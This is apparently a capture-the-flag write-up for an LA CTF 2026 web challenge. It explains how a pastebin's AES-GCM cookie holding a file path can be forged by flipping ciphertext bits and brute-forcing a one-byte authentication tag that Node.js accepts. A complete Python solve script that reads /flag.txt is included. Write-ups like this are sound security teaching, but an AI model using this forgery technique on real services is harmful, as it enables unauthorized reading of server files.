---
title: LA CTF 2026 - zero-trust web challenge
date: 2026-02-08 08:05
tags: ctf, writeup, security, reverse engineering
---

## The setup

We land on a simple pastebin app. We can type some text, save it, come back later
and it's still there. Behind the scenes the server keeps track of *our* paste by
storing a file path in an "encrypted" cookie:

```
cookie = iv . authTag . encrypt({"tmpfile":"/tmp/pastestore/abc123..."})
```

<br>

When we visit the page, the server decrypts our cookie, reads whatever file path
is inside, and shows us the contents. The flag lives at `/flag.txt` - so if we
could make the cookie decrypt to `{"tmpfile":"/flag.txt"}`, we win.

<br>

## The old challenge (2023)

This is actually a sequel. The 2023 version ("zero-trust") had a fatal flaw: it
used AES-GCM encryption but **never verified the authentication tag**. AES-GCM
encrypts data with a stream of XOR bytes, so if you know what the plaintext says
you can flip ciphertext bits to change it into whatever you want. No key was needed.

<br>

According to the author, that was patched. The 2025 code now calls `decipher.final()`, which checks the tag
and throws an error if anything was tampered with. Game over...
or is it?

<br>

## The new trick - "How many bytes is your lock?"

Besides the encrypted data, AES-GCM produces a 16-byte **authentication tag** - a cryptographic checksum derived from the key, IV, and ciphertext. On decryption the tag is recomputed and compared to the one in the cookie; if a single bit was flipped, the tags won't match and the server rejects the cookie. We can think of it as a tamper-evident seal.

<br>

Here's the fun part. That seal is normally 16 bytes (128 bits) - impossible to guess. But Node.js has a quirky default: if you hand it a **shorter** tag, it only checks the bytes you gave it. Give it 4 bytes? It checks 4. Give it **1 byte**? It checks just that one byte.

<br>

One byte = 256 possible values. A number that low, it's almost like a suggestion.

<br>

## The attack

1 **Grab a cookie** from the server. We know the plaintext starts with `{"tmpfile":"/tmp/pastestore/` because the code tells us so.

<br>

2 **Bitflip the ciphertext.** XOR out the known prefix, XOR in our target: `{"tmpfile":"/flag.txt","a":"`. The random hex tail stays in place and becomes a harmless dummy JSON field - the result is still valid JSON.

<br>

3 **Shrink the tag to 1 byte** and just try all 256 values. When the server doesn't issue a fresh `Set-Cookie`, we know it accepted our forgery.

<br>

4 **Read the response.** The page now shows the contents of `/flag.txt`.

<br>

The whole thing takes about 256 HTTPS requests - easy enough.

<br>

> Flag: `lactf{4pl3t...7y}`

<br>

## Solve script

```

import base64
import http.client
import ssl
import sys
import time
from urllib.parse import unquote

HOST = "single-trust.chall.lac.tf"

KNOWN_PREFIX  = b'{"tmpfile":"/tmp/pastestore/'
TARGET_PREFIX = b'{"tmpfile":"/flag.txt","a":"'


def fetch(cookie=None):
    conn = http.client.HTTPSConnection(HOST, context=ssl.create_default_context())
    headers = {"User-Agent": "curl/8.13.0"}
    if cookie:
        headers["Cookie"] = f"auth={cookie}"
    conn.request("GET", "/", headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode()
    hdrs = {k.lower(): v for k, v in resp.getheaders()}
    conn.close()
    return hdrs, body


def get_cookie():
    hdrs, _ = fetch()
    for part in hdrs.get("set-cookie", "").split(";"):
        part = part.strip()
        if part.startswith("auth="):
            return unquote(part[5:])


def split_cookie(cookie):
    iv, tag, ct = [base64.b64decode(p) for p in cookie.split(".")]
    return iv, tag, ct


def join_cookie(iv, tag, ct):
    return ".".join(base64.b64encode(p).decode() for p in (iv, tag, ct))


def bitflip(ct, known, target):
    out = bytearray(len(known))
    for i in range(len(known)):
        out[i] = ct[i] ^ known[i] ^ target[i]
    return bytes(out) + ct[len(known):]


def main():
    print("[*] Fetching auth cookie")
    cookie = get_cookie()
    iv, tag, ct = split_cookie(cookie)
    print(f"[+] iv={len(iv)}B  tag={len(tag)}B  ct={len(ct)}B")

    evil_ct = bitflip(ct, KNOWN_PREFIX, TARGET_PREFIX)

    print("[*] Brute-forcing 1-byte auth tag (0x00..0xff)")
    t0 = time.time()
    for i in range(256):
        evil_cookie = join_cookie(iv, bytes([i]), evil_ct)
        hdrs, body = fetch(evil_cookie)

        if "set-cookie" not in hdrs:
            print(f"\n[+] Valid tag byte: 0x{i:02x}  ({time.time()-t0:.1f}s)")

            if "lactf{" in body:
                flag = body[body.index("lactf{"):body.index("}", body.index("lactf{")) + 1]
                print(f"[*] Flag: {flag}")
            else:
                print(body)
            return

        if i % 32 == 0:
            sys.stdout.write(f"\r[*] {i}/256 ...")
            sys.stdout.flush()

    print("\n[-] 1-byte tag exhausted - try 2-byte (65 536 attempts)")


if __name__ == "__main__":
    main()

```

